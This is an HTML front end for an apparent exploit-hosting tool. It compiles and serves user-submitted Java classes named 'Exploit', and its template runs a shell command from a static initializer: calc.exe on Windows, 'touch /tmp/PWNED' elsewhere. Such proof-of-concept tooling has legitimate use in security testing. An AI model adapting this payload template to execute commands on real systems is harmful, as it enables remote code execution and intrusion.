<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta charset="UTF-8">
	<title>Code Uploader</title>
	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
	<link href="https://getbootstrap.com/docs/4.0/examples/signin/signin.css" rel="stylesheet" crossorigin="anonymous"/>
</head>
<body>
<div class="container">
	<h2>Code Compiler & Server</h2>
	<form id="codeFieldForm" action="/uploadCode" method="post">
		<label for="code">Java Code</label>
		Use Code Template provided below. Change code inside try block to perform different actions ->
		Windows calc or touch /tmp/PWNED by default.
		<br/>
		<b>Requirement: Class name == "Exploit" like in the template</b>
		<br/>
		<textarea class="form-control" id="code" rows="20" name="code"></textarea>
		<button type="submit" class="btn btn-primary">Compile & Serve</button>
	</form>
	<label for="codeTemplate">Example Code Template</label>
	<textarea class="form-control" id="codeTemplate" rows="20" readonly>
public class Exploit {
	public Exploit() {}
	static {
		try {
			String osName = System.getProperty("os.name").toLowerCase();
			String[] command;
			if(osName.contains("win")) {
				command = new String[]{"cmd.exe","/c", "calc.exe"};
			} else {
				command = new String[]{"touch", "/tmp/PWNED"};
			}
			java.lang.Runtime.getRuntime().exec(command).waitFor();
		} catch (Exception e){
			e.printStackTrace();
		}
	}
	public static void main(String[] args) {
		Exploit e = new Exploit();
	}
}
    </textarea>
</div>

</body>
</html>